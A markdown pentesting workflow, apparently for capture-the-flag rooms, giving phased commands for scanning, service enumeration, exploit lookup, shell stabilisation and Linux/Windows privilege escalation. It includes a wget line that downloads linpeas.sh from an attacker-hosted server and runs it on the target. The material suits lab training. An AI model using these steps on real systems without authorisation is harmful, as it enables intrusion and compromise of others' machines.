# Cybersecurity Methodology

This is Ghost Girl's pentesting workflow. Follow these phases sequentially, but adapt based on findings. At each phase transition, pause and brief the operator.

## Phase 1: Reconnaissance

**Objective:** Map the attack surface. Identify all open ports, services, and versions.

**Actions:**
1. Quick TCP scan for common ports:
   ```bash
   nmap -sC -sV -oN sessions/<room>/nmap-initial.txt <TARGET_IP>
   ```
2. Full TCP port scan (background while reviewing initial results):
   ```bash
   nmap -p- -T4 -oN sessions/<room>/nmap-full.txt <TARGET_IP>
   ```
3. UDP scan on top ports if TCP doesn't yield enough:
   ```bash
   nmap -sU --top-ports 50 -oN sessions/<room>/nmap-udp.txt <TARGET_IP>
   ```

**Phase Transition Brief:**
- List all open ports and services
- Highlight anything unusual or interesting
- Suggest which services to enumerate first and why

## Phase 2: Enumeration

**Objective:** Deep dive into each identified service. Extract usernames, directories, shares, versions, misconfigurations.

**Per-Service Playbook:**

### HTTP/HTTPS (80, 443, 8080, etc.)
1. Browse manually — check source, robots.txt, sitemap
2. Directory bruteforce:
   ```bash
   gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o sessions/<room>/gobuster.txt
   ```
3. Vulnerability scan:
   ```bash
   nikto -h http://<TARGET_IP> -o sessions/<room>/nikto.txt
   ```
4. Check for CMS (WordPress, Joomla, etc.) and run specific scanners
5. Look for login pages, file upload, input fields

### SMB (139, 445)
1. Enumerate shares:
   ```bash
   smbclient -L //<TARGET_IP> -N
   ```
2. Full enumeration:
   ```bash
   enum4linux -a <TARGET_IP> | tee sessions/<room>/enum4linux.txt
   ```
3. Check for anonymous access to each share

### FTP (21)
1. Check for anonymous login:
   ```bash
   ftp <TARGET_IP>
   ```
   (try anonymous/anonymous)
2. Check version for known exploits

### SSH (22)
1. Note version (for CVE checking)
2. Try default/common credentials if we find usernames
3. Check for key-based auth vectors

### Other Services
- Research the service and version
- Check searchsploit: `searchsploit <service> <version>`
- Check for default credentials

**Phase Transition Brief:**
- Summarize all findings per service
- Identify potential entry points ranked by likelihood
- Suggest exploitation approach

## Phase 3: Vulnerability Analysis

**Objective:** Match findings against known vulnerabilities.

**Actions:**
1. Search for exploits:
   ```bash
   searchsploit <service> <version>
   ```
2. Check CVE databases for service versions found
3. Review misconfigurations (default creds, anonymous access, directory listings)
4. Assess each vulnerability: likelihood of success, impact, difficulty

**Phase Transition Brief:**
- Ranked list of vulnerabilities to try
- Recommended order of exploitation attempts
- Any additional information needed before attempting

## Phase 4: Exploitation

**Objective:** Gain initial access to the target.

**Principles:**
- Start with the lowest-effort, highest-probability vector
- Document every attempt (success AND failure)
- Try manual exploitation before reaching for automated tools
- If using Metasploit or similar, understand what the exploit does

**Common Vectors:**
- Default/weak credentials (always try first)
- Known CVE exploits via searchsploit
- Web application attacks (SQLi, LFI/RFI, file upload, command injection)
- Service-specific exploits

**When we get a shell:**
1. Stabilize it immediately:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   # Ctrl+Z
   stty raw -echo; fg
   export TERM=xterm
   ```
2. Identify who we are: `whoami`, `id`, `hostname`
3. Grab the user flag if applicable
4. Move to post-exploitation

## Phase 5: Post-Exploitation

**Objective:** Enumerate the internal environment for privilege escalation vectors.

**Actions:**
1. System info: `uname -a`, `cat /etc/os-release`
2. Current user context: `id`, `sudo -l`, `groups`
3. Automated enumeration:
   ```bash
   # Upload and run linpeas
   # On attacker: python3 -m http.server 8000
   # On target: wget http://<ATTACKER_IP>:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
   ```
4. Manual checks:
   - SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
   - Writable directories: `find / -writable -type d 2>/dev/null`
   - Cron jobs: `cat /etc/crontab`, `ls -la /etc/cron.*`
   - Running processes: `ps aux`
   - Network connections: `netstat -tulnp` or `ss -tulnp`
   - Interesting files: config files, passwords, SSH keys

## Phase 6: Privilege Escalation

**Objective:** Escalate from current user to root (or equivalent).

**Common Vectors (Linux):**
- **sudo misconfig:** `sudo -l` — check GTFOBins for any allowed binaries
- **SUID binaries:** Check GTFOBins for exploitable SUID binaries
- **Kernel exploits:** Match `uname -a` against known kernel exploits
- **Cron jobs:** Writable scripts run by root
- **PATH hijacking:** Writable directories in PATH used by privileged processes
- **Capabilities:** `getcap -r / 2>/dev/null`
- **NFS:** Check for no_root_squash in `/etc/exports`

**Common Vectors (Windows):**
- Service misconfigurations
- Unquoted service paths
- AlwaysInstallElevated
- Token impersonation (Juicy/Rotten/Sweet Potato)
- Scheduled tasks

**After escalation:**
1. Verify: `whoami` should show root
2. Grab the root flag
3. Document the full attack chain

## Phase 7: Documentation

**Objective:** Record everything in the session file.

**Session file should contain:**
- Target information (IP, room name, difficulty)
- Full attack chain from recon to root
- All flags captured
- Tools and techniques used
- What worked, what didn't, and why
- Key lessons learned
- Areas to study further
